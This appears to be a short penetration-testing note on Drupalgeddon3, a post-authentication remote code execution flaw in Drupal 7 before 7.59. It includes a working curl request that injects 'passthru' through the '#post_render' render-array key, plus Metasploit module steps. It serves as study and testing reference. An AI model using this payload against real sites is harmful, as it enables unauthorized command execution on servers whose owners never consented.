- Critical post-authentication RCE.
- Affects `Drupal 7.x < 7.59`.
- Requires basic authenticated access.
- Exploits a render callback vulnerability to execute PHP code.
# Vulnerability

- Render array system allowed some injection paths when certain internal objects were mishandled.
- Attackers leverage form previous to inject render array with dangerous callbacks:
	- `#post_render`
	- `#lazy_builder`
- Injection occurs during form validation and rendering stages - results in code exec.
# Exploitation

- Prerequisites:
	- valid authenticated user.
	- access to a previewable form.
- Send a POST to a previewable form with payloads like:
	- `#post_render[] = passthru`
	- `#markup = id`
	- An example:
		- `curl -X POST http://target/?q=comment/reply/1 -b "SESS<cookie>" --data "form_id=comment_form&comment_body[und][0][value][#post_render][]=passthru&comment_body[und][0][value][#markup]=id" `
- Using [[Metasploit]]:
	- `use exploit/unix/webapps/drupal_drupalgeddon3`
	- `set RHOSTS http://target`
	- `set USERNAME user`
	- `set PASSWORD pass`
	- `run`

